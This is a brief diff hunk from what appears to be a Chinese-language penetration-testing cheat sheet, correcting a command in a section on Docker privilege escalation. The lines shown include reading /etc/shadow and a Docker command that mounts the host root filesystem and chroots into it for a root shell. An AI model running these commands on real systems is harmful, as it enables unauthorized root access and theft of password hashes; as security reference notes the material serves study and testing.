@@ -613,7 +613,7 @@ cat /etc/shadow
 
 # docker定时任务提权
 ```bash
-docker image # 查看是否可以提权
+docker image ls # 查看是否可以提权
 docker run -v /:/mnt --rm -it redmine chroot /mnt bash
 ```
 
